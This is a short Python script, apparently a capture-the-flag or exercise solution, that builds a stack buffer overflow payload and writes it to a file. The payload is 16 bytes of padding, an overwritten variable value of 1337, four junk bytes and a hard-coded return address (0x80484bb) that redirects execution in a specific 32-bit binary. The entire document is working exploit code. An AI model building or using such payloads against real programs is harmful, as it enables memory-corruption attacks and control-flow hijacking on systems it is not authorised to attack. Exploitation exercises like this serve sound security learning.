#!/usr/bin/env python
import struct

payload = 'A'*16
payload += struct.pack("<I", 1337)
payload += 'JUNK'
payload += struct.pack("<I", 0x80484bb)

open('payload', 'w').write(payload)
